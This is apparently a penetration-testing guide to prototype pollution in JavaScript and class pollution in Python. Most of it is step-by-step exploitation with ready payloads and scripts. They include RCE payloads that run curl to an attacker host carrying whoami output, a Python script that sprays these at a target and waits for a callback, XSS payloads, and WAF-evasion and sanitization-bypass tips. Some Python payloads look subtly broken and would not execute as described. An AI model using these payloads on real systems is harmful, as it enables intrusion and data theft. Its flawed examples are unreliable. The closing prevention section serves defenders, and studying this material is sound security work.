## Prototype Pollution Vulnerabilities

- **What prototype pollution is**
  - Vulnerability that allows an attacker to modify the prototype of built-in JavaScript or Python objects
  - Ability to inject or modify properties that all objects of a certain type inherit
  - Manipulation of core language behavior through prototype chain modification
  - In JavaScript: polluting Object.prototype or other prototype objects
  - In Python: similar concept called "class pollution" affecting class inheritance
  - Typically affects dynamic property merging functions without proper sanitization
  - Changes behavior of all objects inheriting from the polluted prototype
  - Creates unexpected behaviors that can lead to security vulnerabilities
  - Attacks the fundamental inheritance model of the language
  - Often difficult to detect through standard security testing
  - Affects both client-side (browsers) and server-side (Node.js, Python) applications

- **How vulnerabilities arise**
  - **JavaScript prototype pollution**:
    - Recursive object merging without property key validation
    - Improper sanitization of user-controlled inputs
    - Unsafe handling of `__proto__` property or constructor.prototype
    - Use of vulnerable third-party libraries with merge/extend functions
    - Parsing and merging of user-controlled JSON data
    - Dynamic property assignment using bracket notation
    - Lack of Object.freeze() on Object.prototype
    - Missing input validation on special properties like __proto__
  
  - **Python class pollution**:
    - Dynamic attribute setting without validation
    - Recursive merging of dictionaries into objects
    - Improper handling of special attributes like __class__, __base__, __mro__
    - Use of setattr() with user-controlled inputs
    - Allowing access to __class__ or __dict__ modifications
    - Missing input validation for dangerous attributes
    - Unsafe deserialization of user-supplied data

- **Impact**
  - Remote code execution (RCE) in Node.js or Python applications
  - Cross-site scripting (XSS) in client-side applications
  - Security control bypass by manipulating configuration objects
  - Privilege escalation through modification of isAdmin-type properties
  - Authentication bypass by altering verification logic
  - Server-side request forgery (SSRF) through URL manipulation
  - Information disclosure via error message manipulation
  - Denial of service through prototype chain disruption
  - Session hijacking by manipulating token verification
  - Breaking application logic by modifying core behavior
  - Supply chain attacks when exploiting libraries with prototype pollution

- **Types of prototype pollution**

  - **Client-side prototype pollution**
    - Occurs in browser environments
    - Often leads to DOM-based XSS
    - Usually exploited through URL fragments or query parameters
    - Easier to detect but limited in impact
    - Typically affects single-user sessions
    - Common vectors: URL hash fragments, localStorage, postMessage
    - Exploited through script gadgets in frontend libraries
    - Often affects client-side rendering frameworks

  - **Server-side prototype pollution**
    - Occurs in Node.js or other server environments
    - Can lead to RCE, SSRF, or privilege escalation
    - Usually exploited through API requests with JSON payloads
    - Harder to detect but higher impact
    - Affects all users of the application
    - Common vectors: JSON API bodies, nested parameters
    - Often exploited through child_process or other modules
    - May impact server configuration or database operations

  - **Python class pollution**
    - Similar to prototype pollution but in Python's class model
    - Affects class inheritance chain instead of prototypes
    - Modifies __class__, __base__, or __mro__ attributes
    - Can lead to RCE through subprocess or other dangerous modules
    - Usually requires access to object's __dict__ or setattr()
    - Less common but equally dangerous
    - Often exploited through deserialization vulnerabilities
    - May allow access to Python's globals dictionary

- **Identifying vulnerable applications**
  - Look for applications that process complex JSON structures
  - Identify user-controlled inputs that are merged with existing objects
  - Check for recursive merge functions in JavaScript code
  - Review use of lodash.merge, jQuery.extend, or similar functions
  - Look for dynamic property assignment using bracket notation
  - Identify setattr() usage in Python applications
  - Check for object cloning or recursive copying functions
  - Look for error messages that reveal prototype pollution
  - Use automated scanning tools to detect potential vulnerabilities
  - Review third-party libraries for known prototype pollution issues

- **Using testing tools**
  - **For client-side testing**:
    - Burp Suite with Prototype Pollution Scanner extension
    - ppfuzz (https://github.com/dwisiswant0/ppfuzz)
    - ppmap (https://github.com/kleiton0x00/ppmap)
    - proto-find (https://github.com/kosmosec/proto-find)
    - PPScan browser extension
    - Burp Collaborator for callback detection
  
  - **For server-side testing**:
    - Burp Suite Professional with active scanning
    - Custom scripts to test for pollution in API responses
    - nodexp (Node.js Exploit Development Tool)
    - JavaScript Static Analysis tools
    - Manual parameter fuzzing and response analysis
    - Node.js debugger for tracing pollution effects

  - **For Python class pollution**:
    - Custom testing scripts
    - Python debugger (pdb) for tracing object modifications
    - Static analysis tools for Python
    - Manual code review focusing on attribute assignment

- **Step-by-step exploitation techniques**

  - **Client-side JavaScript prototype pollution**
    1. **URL fragment-based pollution**:
       - Step 1: Identify a potential parameter reflected in client-side code
       - Step 2: Attempt to pollute Object.prototype using the hash fragment:
         ```
         https://vulnerable-website.com/#__proto__[property]=value
         ```
       - Step 3: Verify pollution by checking if `{}[property]` equals `value` in browser console
       - Step 4: Look for script gadgets that use the polluted property
       - Step 5: Construct a payload that triggers the gadget with malicious content
       - Example: `https://vulnerable-website.com/#__proto__[innerHTML]=<img/src/onerror=alert(1)>`
       - Testing insight: Try different property formats (`__proto__`, `constructor.prototype`)
       - Python script for URL fragment pollution testing:
       ```python
       import requests
       from urllib.parse import quote
       
       def test_url_pollution(base_url, properties_to_test):
           results = []
           
           for prop in properties_to_test:
               test_url = f"{base_url}#__proto__[{prop}]=POLLUTION_TEST"
               response = requests.get(test_url)
               
               # Check if the response indicates successful pollution
               # This is application-specific and might require manual verification
               if "POLLUTION_TEST" in response.text:
                   results.append(f"Potential pollution via property: {prop}")
           
           return results
       
       # Example usage
       base_url = "https://vulnerable-website.com/"
       properties_to_test = ["isAdmin", "configUrl", "url", "src", "innerHTML", "data"]
       
       findings = test_url_pollution(base_url, properties_to_test)
       for finding in findings:
           print(finding)
       ```

    2. **JSON-based client-side pollution**:
       - Step 1: Identify endpoints that accept JSON data and pass it to client-side code
       - Step 2: Intercept the request and modify the JSON payload to include `__proto__`:
       ```json
       {
         "username": "user",
         "__proto__": {
           "isAdmin": true
         }
       }
       ```
       - Step 3: Send the modified request and observe client-side behavior changes
       - Step 4: Look for script gadgets that use the polluted property
       - Step 5: Construct a malicious payload targeting identified gadgets
       - Example JSON payload for XSS:
       ```json
       {
         "username": "user",
         "__proto__": {
           "src": "data:,alert(1)"
         }
       }
       ```
       - Testing insight: Some applications may sanitize `__proto__` but not `constructor.prototype`
       - JavaScript for testing JSON pollution in console:
       ```javascript
       // Test if prototype pollution is possible
       function testPrototypePollution() {
           const testProperty = 'testPollution' + Math.random().toString(36).substring(2);
           const testValue = 'polluted' + Math.random().toString(36).substring(2);
           
           // Try different pollution vectors
           const vectors = [
               { name: "__proto__", payload: { "__proto__": { [testProperty]: testValue } } },
               { name: "constructor.prototype", payload: { "constructor": { "prototype": { [testProperty]: testValue } } } }
           ];
           
           for (const vector of vectors) {
               // Create a test object and merge with payload
               const testObj = {};
               deepMerge(testObj, vector.payload);
               
               // Check if pollution worked
               const emptyObj = {};
               if (emptyObj[testProperty] === testValue) {
                   console.log(`Prototype pollution successful via ${vector.name}`);
                   // Clean up
                   delete Object.prototype[testProperty];
                   return true;
               }
           }
           
           console.log("No prototype pollution detected");
           return false;
       }
       
       // A basic deep merge function (similar to what vulnerable apps might use)
       function deepMerge(target, source) {
           for (const key in source) {
               if (source[key] && typeof source[key] === 'object') {
                   if (!target[key]) Object.assign(target, { [key]: {} });
                   deepMerge(target[key], source[key]);
               } else {
                   Object.assign(target, { [key]: source[key] });
               }
           }
           return target;
       }
       
       testPrototypePollution();
       ```

    3. **Finding and exploiting script gadgets**:
       - Step 1: Successfully pollute a property on Object.prototype
       - Step 2: Search for 'gadget' code that uses the property without checking if it's from the prototype
       - Step 3: Identify properties that flow into dangerous sinks like innerHTML, eval, document.write
       - Step 4: Test different properties from common libraries until you find a usable gadget
       - Step 5: Craft a payload targeting the specific gadget
       - Common gadget properties to test:
         - `innerHTML`, `outerHTML` (direct DOM XSS)
         - `src`, `href` (resource loading)
         - `url`, `endpoint`, `callback` (request destinations)
         - `template`, `html` (templating engines)
         - `default`, `defaultValue` (configuration options)
       - Example polluting a config object for XSS:
       ```javascript
       // Vulnerable code:
       function renderUserProfile(config) {
           const template = config.template || defaultTemplate;
           document.querySelector('#profile').innerHTML = template;
       }
       
       // Exploit via URL:
       // https://vulnerable-website.com/#__proto__[template]=<img src=x onerror=alert(1)>
       ```
       - Testing insight: Real-world gadgets often come from third-party libraries like jQuery plugins

  - **Server-side JavaScript prototype pollution**
    1. **Basic server-side pollution via JSON**:
       - Step 1: Identify endpoints that parse JSON and merge objects
       - Step 2: Craft a JSON payload with `__proto__` property:
       ```json
       {
         "user": "john",
         "__proto__": {
           "isAdmin": true
         }
       }
       ```
       - Step 3: Send the payload and observe server behavior changes
       - Step 4: Look for changes in response that indicate successful pollution
       - Step 5: Escalate to more impactful payloads once pollution is confirmed
       - Example: If the application checks `user.isAdmin` without using hasOwnProperty
       - Testing insight: Server-side pollution effects persist across requests in the same process
       - Node.js test script for local testing:
       ```javascript
       const express = require('express');
       const bodyParser = require('body-parser');
       const app = express();

       app.use(bodyParser.json());

       // Vulnerable merge function
       function merge(target, source) {
           for (let key in source) {
               if (key in source && typeof source[key] === 'object') {
                   if (!target[key]) target[key] = {};
                   merge(target[key], source[key]);
               } else {
                   target[key] = source[key];
               }
           }
           return target;
       }

       app.post('/api/update', (req, res) => {
           const user = { name: 'Default' };
           merge(user, req.body);
           
           // Log to demonstrate pollution
           console.log('User object:', user);
           console.log('Empty object test:', {});
           
           res.json({ success: true });
       });

       app.listen(3000, () => console.log('Server listening on port 3000'));
       ```

    2. **RCE via child_process pollution**:
       - Step 1: Confirm successful prototype pollution on the server
       - Step 2: Target properties that affect how child_process executes commands
       - Step 3: Create a payload targeting `shell` or `NODE_OPTIONS` properties:
       ```json
       {
         "username": "user",
         "__proto__": {
           "shell": "node",
           "NODE_OPTIONS": "--require /proc/self/environ"
         }
       }
       ```
       - Step 4: Send the payload to an endpoint that merges user data
       - Step 5: Trigger code that executes child_process.spawn or similar functions
       - Example RCE payload using execArgv:
       ```json
       {
         "__proto__": {
           "execArgv": [
             "--eval=require('child_process').execSync('curl http://attacker.com/$(whoami)')"
           ]
         }
       }
       ```
       - Testing insight: Successful RCE may require multiple pollution attempts targeting different properties
       - Python script for testing child_process pollution:
       ```python
       import requests
       import time
       
       def test_child_process_pollution(url, callback_url):
           # Different child_process pollution payloads to try
           payloads = [
               # Payload 1: shell and env.EVIL
               {
                   "__proto__": {
                       "shell": "node",
                       "env": {
                           "EVIL": "require('child_process').execSync(`curl ${callback_url}/$(whoami)`)"
                       },
                       "NODE_OPTIONS": "--require /proc/self/environ"
                   }
               },
               # Payload 2: execArgv
               {
                   "__proto__": {
                       "execArgv": [
                           f"--eval=require('child_process').execSync('curl {callback_url}/$(whoami)')"
                       ]
                   }
               }
           ]
           
           for i, payload in enumerate(payloads):
               print(f"Trying payload {i+1}...")
               try:
                   response = requests.post(url, json=payload, timeout=5)
                   print(f"Response status: {response.status_code}")
                   # Need to wait for the callback to potentially happen
                   time.sleep(3)
               except Exception as e:
                   print(f"Error: {e}")
           
           print("Check your callback server for incoming requests indicating successful RCE")
       
       # Example usage
       test_child_process_pollution(
           "https://vulnerable-api.com/api/user/update",
           "http://attacker-callback.com"
       )
       ```

    3. **Status code and error message manipulation**:
       - Step 1: Identify error responses that include status codes
       - Step 2: Attempt to pollute the status property:
       ```json
       {
         "__proto__": {
           "status": 555,
           "statusCode": 555
         }
       }
       ```
       - Step 3: Trigger an error in the application (e.g., send invalid input)
       - Step 4: Check if the response contains the custom status code
       - Step 5: Use this confirmation to verify prototype pollution exists
       - Example: Applications using Express or similar frameworks
       - Testing insight: This technique is useful for detecting pollution when other effects aren't visible
       - JavaScript function for status code pollution testing:
       ```javascript
       async function testStatusPollution(url) {
           // First, try to pollute status property
           const pollutionResponse = await fetch(url, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                   "__proto__": {
                       "status": 555,
                       "statusCode": 555,
                       "message": "PP_TEST_SUCCESSFUL"
                   }
               })
           });
           
           // Now, send a broken request to trigger an error
           try {
               const brokenResponse = await fetch(url, {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: '{"broken: json}'  // Intentionally broken JSON
               });
               
               const errorData = await brokenResponse.json();
               console.log("Error response:", errorData);
               
               // Check if our pollution worked
               if (
                   errorData.status === 555 || 
                   errorData.statusCode === 555 || 
                   errorData.message === "PP_TEST_SUCCESSFUL" ||
                   errorData.error?.status === 555 ||
                   errorData.error?.message === "PP_TEST_SUCCESSFUL"
               ) {
                   console.log("Prototype pollution detected via status code/message manipulation!");
                   return true;
               }
           } catch (e) {
               console.log("Error testing pollution:", e);
           }
           
           return false;
       }
       ```

    4. **JSON spaces manipulation for detection**:
       - Step 1: Send a pollution attempt targeting the `json spaces` property:
       ```json
       {
         "__proto__": {
           "json spaces": 10
         }
       }
       ```
       - Step 2: Make a request that returns JSON data
       - Step 3: Check if the JSON response has extensive indentation (10 spaces)
       - Step 4: Use this as a confirmation that prototype pollution is possible
       - Step 5: Proceed with more impactful exploitation
       - Example: Applications using Express's res.json() or similar functions
       - Testing insight: This provides a non-destructive way to confirm pollution success
       - Python detection script:
       ```python
       import requests
       import json
       
       def check_json_spaces_pollution(url):
           # Send the pollution payload
           pollution_payload = {
               "__proto__": {
                   "json spaces": 10
               }
           }
           
           session = requests.Session()
           session.post(url, json=pollution_payload)
           
           # Now request an endpoint that returns JSON
           response = session.get(url + "/api/data")
           
           # Check the raw response for excessive spaces
           raw_response = response.text
           
           # If successful, the JSON should have 10-space indentation
           # We can detect this by looking for patterns like:
           # {
           #           "key": "value"
           # }
           
           if '          "' in raw_response:
               print("JSON spaces pollution successful!")
               print("Raw response sample:")
               print(raw_response[:200] + "..." if len(raw_response) > 200 else raw_response)
               return True
           
           print("JSON spaces pollution unsuccessful")
           return False
       
       # Example usage
       check_json_spaces_pollution("https://vulnerable-api.com")
       ```

  - **Python class pollution techniques**
    1. **Basic class attribute manipulation**:
       - Step 1: Identify Python applications that dynamically set object attributes
       - Step 2: Test if you can access and modify the `__class__` attribute:
       ```python
       # Payload structure
       {
           "__class__": {
               "__qualname__": "PollutedClass"
           }
       }
       ```
       - Step 3: Check the response for signs that the class name was changed
       - Step 4: Attempt to modify `__base__` to affect parent classes
       - Step 5: Escalate to more dangerous attribute modifications
       - Example Python class pollution:
       ```python
       # Server-side vulnerable code
       class User:
           def __init__(self, data):
               for key, value in data.items():
                   setattr(self, key, value)
       
       # Exploit payload
       payload = {
           "__class__": {
               "__qualname__": "PollutedUser"
           }
       }
       user = User(payload)
       print(user)  # Will show <__main__.PollutedUser object at 0x...>
       ```
       - Testing insight: Look for error messages revealing Python class names

    2. **Python RCE via class pollution**:
       - Step 1: Confirm ability to manipulate class attributes
       - Step 2: Target special methods or default parameters that could lead to code execution
       - Step 3: Create a payload that modifies a class method to execute commands:
       ```python
       # Payload structure targeting __init__ default parameters
       {
           "__class__": {
               "__init__": {
                   "__defaults__": [{"command": "import os; os.system('id')"}]
               }
           }
       }
       ```
       - Step 4: Send the payload to a vulnerable endpoint
       - Step 5: Trigger code that instantiates objects of the polluted class
       - Example targeting kwdefaults for RCE:
       ```python
       # Payload targeting kwdefaults
       payload = {
           "__class__": {
               "__init__": {
                   "__kwdefaults__": {
                       "command": "__import__('os').system('id')"
                   }
               }
           }
       }
       ```
       - Testing insight: Different Python versions may require different pollution techniques

    3. **Python globals() access**:
       - Step 1: Identify if you can pollute the `__class__.__init__.__globals__` dictionary
       - Step 2: Attempt to access sensitive variables or modules through globals
       - Step 3: Create a payload targeting global variables:
       ```python
       {
           "__class__": {
               "__init__": {
                   "__globals__": {
                       "os": "__import__('os')"
                   }
               }
           }
       }
       ```
       - Step 4: Send the payload and check for signs of successful pollution
       - Step 5: Use access to globals to execute code or leak sensitive information
       - Example Python code showing globals access:
       ```python
       # Server-side vulnerable code
       def process_user_data(data):
           user = type('User', (), {})()
           for key, value in data.items():
               setattr(user, key, value)
           return user
       
       # Access to globals via pollution
       payload = {
           "__class__": {
               "__init__": {
                   "__globals__": {
                       "API_KEY": "LEAKED"
                   }
               }
           }
       }
       ```
       - Testing insight: globals access provides visibility into the entire application environment

- **Bypassing protections**
  1. **Bypassing __proto__ sanitization**:
     - Use alternative property names: `constructor.prototype` instead of `__proto__`
     - Try nested variations: `__pro__proto__to__` or `_proto_`
     - Use array notation: `["__proto__"]` instead of direct property access
     - Exploit Unicode normalization: Use homoglyphs or alternative representations
     - Try different case variations: `__Proto__`, `__PROTO__`
     - Use object constructor: `constructor.constructor.prototype`
     - Test for template literal parsing: ```${__proto__}```
     - Check for JSON.parse behavior differences

  2. **Evading WAF detection**:
     - Split the payload across multiple requests to avoid signature detection
     - Use non-standard but equivalent properties (`constructor.prototype`)
     - Encode property names using URL encoding or Unicode escaping
     - Leverage browser quirks in parsing and property access
     - Use different formats for the same property (array notation vs dot notation)
     - Chain multiple smaller pollution steps instead of one large payload
     - Try JSON with comments or whitespace variations if supported
     - Use padding/comments to avoid signature matching

  3. **Prototype pollution in restricted environments**:
     - Use `Object.setPrototypeOf()` when direct `__proto__` access is restricted
     - Try Reflect API alternatives: `Reflect.setPrototypeOf()`
     - Look for indirect pollution through built-in methods
     - Identify trusted objects that might not have the same restrictions
     - Leverage framework-specific quirks in object handling
     - Test for inconsistencies between JSON parser and JavaScript runtime
     - Check for outdated polyfills that might be vulnerable
     - Look for object spread operator (`...`) vulnerabilities

- **Real-world exploitation examples**
  1. **Exploiting Node.js applications**:
     - **Lodash pollution (CVE-2019-10744)**:
       - Step 1: Identify an application using a vulnerable Lodash version
       - Step 2: Create a payload targeting the merge function:
       ```json
       {
         "__proto__": {
           "shell": "node",
           "NODE_OPTIONS": "--inspect=attackers-server.com"
         }
       }
       ```
       - Step 3: Send the payload to an endpoint using lodash.merge
       - Step 4: Trigger functionality that uses child_process
       - Step 5: Observe RCE through the pollution

     - **Express.js error handling**:
       - Step 1: Pollute the status code property:
       ```json
       {
         "__proto__": {
           "statusCode": 500,
           "status": 500
         }
       }
       ```
       - Step 2: Induce an error in the application
       - Step 3: Observe if the error response uses the polluted status code
       - Step 4: Escalate to more impactful property pollution

     - **jQuery extend pollution**:
       - Step 1: Identify an application using jQuery.extend with deep copy
       - Step 2: Create a payload targeting the extend function:
       ```json
       {
         "__proto__": {
           "isAdmin": true
         }
       }
       ```
       - Step 3: Send the payload to an endpoint using jQuery.extend
       - Step 4: Check if access control checks are now bypassed

  2. **Exploiting Python applications**:
     - **Django class pollution example**:
       - Step 1: Identify a Django app with unsafe deserialization
       - Step 2: Create a payload targeting model class attributes:
       ```json
       {
         "__class__": {
           "__qualname__": "PollutedModel"
         }
       }
       ```
       - Step 3: Send the payload to a vulnerable view
       - Step 4: Check if the model class was successfully modified
       - Step 5: Escalate to targeting `__init__` or other dangerous attributes

     - **Flask template injection via class pollution**:
       - Step 1: Identify a Flask app with vulnerable object attribute setting
       - Step 2: Craft a payload targeting template rendering:
       ```json
       {
         "__class__": {
           "__init__": {
             "__globals__": {
               "render_template": "{{config}}"
             }
           }
         }
       }
       ```
       - Step 3: Send the payload to a vulnerable endpoint
       - Step 4: Trigger a template rendering function
       - Step 5: Observe template injection via polluted globals

  3. **Client-side exploitation examples**:
     - **React DOM pollution for XSS**:
       - Step 1: Identify a React application with unsafe object merging
       - Step 2: Craft a payload targeting dangerouslySetInnerHTML:
       ```
       #__proto__[dangerouslySetInnerHTML]={ __html: <img src onerror=alert(1)> }
       ```
       - Step 3: Navigate to the vulnerable page with the payload
       - Step 4: Observe XSS execution when React renders components

     - **Angular template pollution**:
       - Step 1: Identify an Angular application that merges configuration objects
       - Step 2: Create a payload targeting template compilation:
       ```
       #__proto__[template]=<img src=x onerror=alert(document.domain)>
       ```
       - Step 3: Navigate to the vulnerable page with the payload
       - Step 4: Observe XSS when Angular compiles the polluted template

- **Detection and prevention**
  1. **Client-side prevention**:
     - Use Object.freeze(Object.prototype) to prevent modification
     - Implement input sanitization that removes __proto__ and constructor.prototype
     - Use Map instead of Object for user-controlled collections
     - Avoid using recursive merge functions on user input
     - Perform property existence checks with hasOwnProperty()
     - Use object literals without prototype (Object.create(null))
     - Implement CSP to mitigate XSS exploitation
     - Keep client-side libraries updated against known vulnerabilities

  2. **Server-side prevention**:
     - Validate user input against a schema before processing
     - Use safe alternatives to recursive merge (lodash.mergeWith with customizer)
     - Implement property whitelisting when merging objects
     - Use Object.freeze(Object.prototype) on application startup
     - Keep server-side libraries updated
     - Use objects without prototype (Object.create(null))
     - Add middleware to sanitize dangerous properties in JSON
     - Implement proper JSON schema validation

  3. **Python-specific prevention**:
     - Avoid using setattr() with user-controlled inputs
     - Implement attribute name whitelisting
     - Use dataclasses or named tuples instead of dynamic attribute assignment
     - Prevent access to special attributes (__class__, __dict__, etc.)
     - Implement proper input validation against schemas
     - Use dedicated serialization libraries with security features
     - Keep Python libraries and frameworks updated
     - Use privilege separation for code handling user input
